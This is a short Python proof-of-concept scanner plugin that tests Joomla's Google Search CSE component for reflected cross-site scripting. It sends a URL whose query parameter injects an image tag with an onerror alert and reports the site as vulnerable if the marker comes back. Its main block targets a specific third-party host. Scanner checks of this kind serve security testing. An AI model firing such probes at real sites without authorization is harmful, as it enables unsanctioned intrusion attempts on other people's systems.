from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
#-*- encoding:utf-8 -*-

import re


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = "index.php?option=com_googlesearch_cse&n=30&Itemid=&cx=017093687396734519753%3Ao_92rwvgxxw&cof=FORID%3A9&ie=ISO-8859-1&q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert('0x2334171512353333>')%3E&sa=Search&hl=en"
        url = arg + payload 
        code, head, res, errcode, _ = curl.curl(url )
        if code==200 and '0x2334171512353333>' in res:
            output(url,result,'hole')
        

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_ab0848ed9726fbfcb5c792e4f10a522d.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_ab0848ed9726fbfcb5c792e4f10a522d.py
#/root/github/poccreate/codesrc/exp-1422.py